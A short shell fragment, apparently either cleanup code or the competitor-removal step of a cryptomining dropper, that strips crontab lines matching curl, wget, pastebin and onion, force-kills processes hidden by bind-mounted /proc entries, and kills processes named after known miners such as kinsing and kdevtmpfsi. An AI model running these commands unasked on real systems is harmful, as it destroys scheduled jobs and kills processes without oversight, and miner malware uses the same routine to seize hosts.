crontab -l | sed '/\.bashgo\|pastebin\|onion\|bprofr\|python\|curl\|wget\|\.sh/d' | crontab -
cat /proc/mounts | awk '{print $2}' | grep -P '/proc/\d+' | grep -Po '\d+' | xargs -I % kill -9 %
pgrep -f 'meshagent|kdevchecker|ipv6_addrconfd|kworkerr|cpuhelp|deamon|ksoftriqd|pastebin|solr.sh|solrd|kinsing|kdevtmpfsi|kthreaddk|linuxsys|rnv2ymcl|skid.x86|getpy.sh' | xargs -r kill
